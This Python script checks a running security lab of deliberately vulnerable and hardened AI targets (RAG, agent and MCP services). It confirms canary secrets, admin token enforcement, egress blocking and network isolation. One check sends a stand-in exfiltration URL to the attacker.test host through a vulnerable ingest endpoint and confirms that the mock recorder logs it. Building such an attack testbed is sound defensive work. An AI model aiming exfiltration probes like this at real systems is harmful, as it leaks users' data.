"""Live checks for a running lab (make targets-verify). Exits non-zero if any check fails.

1. Every service is healthy through the gateway.
2. Each target's planted secrets match the HMAC derivation Parry's judges will use.
3. Lab admin endpoints refuse requests without the token.
4. The mock exfiltration recorder captures requests from inside the lab network.
5. The hardened egress allowlist blocks the same request (and nothing is recorded).
6. Lab containers have no route to the internet.
7. MCP servers answer over streamable HTTP through the gateway.
"""

from __future__ import annotations

import subprocess
import sys
import uuid

import anyio
import httpx
from mcp.client.client import Client

from targets.lab.admin import admin_token
from targets.lab.canary import lab_seed, secrets_for

GATEWAY = "http://localhost"
PORTS = {
    "vuln-rag": 8101, "hard-rag": 8102, "vuln-agent": 8111, "hard-agent": 8112,
    "vuln-mcp": 8121, "hard-mcp": 8122,
}  # fmt: skip
MOCKWEB = f"{GATEWAY}:8199"
COMPOSE = ["docker", "compose", "-f", "targets/compose.yaml"]

failures: list[str] = []


def check(ok: bool, label: str) -> None:
    print(f"  {'ok  ' if ok else 'FAIL'} {label}")
    if not ok:
        failures.append(label)


def main() -> int:
    auth = {"X-Lab-Token": admin_token()}
    with httpx.Client(timeout=30) as http:
        print("1. health")
        for name, port in {**PORTS, "mockweb": 8199}.items():
            r = http.get(f"{GATEWAY}:{port}/health")
            check(r.status_code == 200, f"{name} healthy")

        print("2. canaries match derivation (seed from LAB_SEED, default used if unset)")
        for name, port in PORTS.items():
            state = http.get(f"{GATEWAY}:{port}/_lab/state", headers=auth).json()
            check(state["secrets"] == secrets_for(name, lab_seed()).as_dict(), f"{name} secrets")
            check(state["target"] == name, f"{name} identifies itself")

        print("3. admin API requires the token")
        for name, port in PORTS.items():
            r = http.get(f"{GATEWAY}:{port}/_lab/state")
            check(r.status_code == 401, f"{name} rejects anonymous admin access")

        print("4-5. mock exfiltration recorder and egress allowlist")
        http.post(f"{MOCKWEB}/_lab/reset", headers=auth).raise_for_status()
        for name, should_land in (("vuln-rag", True), ("hard-rag", False)):
            nonce = uuid.uuid4().hex[:12]
            url = f"http://attacker.test/collect?probe={nonce}"
            r = http.post(f"{GATEWAY}:{PORTS[name]}/ingest-url", json={"url": url})
            hits = http.get(f"{MOCKWEB}/_lab/hits", params={"host": "attacker.test"}, headers=auth)
            landed = any(nonce in h["query"] for h in hits.json())
            if should_land:
                check(landed, f"{name}: request to attacker.test recorded by the mock endpoint")
            else:
                check(r.status_code == 403 and not landed, f"{name}: egress allowlist blocked it")
        ok = http.post(
            f"{GATEWAY}:{PORTS['hard-rag']}/ingest-url",
            json={"url": "http://docs.harborview.test/shipping-rates"},
        )
        check(ok.status_code == 200, "hard-rag: allowlisted first-party host still reachable")

    print("6. no internet route from lab containers")
    probe = (
        "import socket,sys\n"
        "try:\n socket.create_connection(('1.1.1.1', 443), timeout=3); sys.exit(1)\n"
        "except OSError: sys.exit(0)"
    )
    for svc in ("vuln-rag", "vuln-agent", "vuln-mcp", "mockweb"):
        res = subprocess.run(  # noqa: S603 - fixed argv
            [*COMPOSE, "exec", "-T", svc, "python", "-c", probe], capture_output=True, check=False
        )
        check(res.returncode == 0, f"{svc} cannot reach the internet")

    print("7. MCP over streamable HTTP")

    async def mcp_check(port: int) -> int:
        async with Client(f"{GATEWAY}:{port}/mcp") as c:
            return len((await c.list_tools()).tools)

    for name in ("vuln-mcp", "hard-mcp"):
        n = anyio.run(mcp_check, PORTS[name])
        check(n == 6, f"{name} lists {n} tools")

    print(f"\n{'all checks passed' if not failures else f'{len(failures)} check(s) failed'}")
    return 1 if failures else 0


if __name__ == "__main__":
    sys.exit(main())
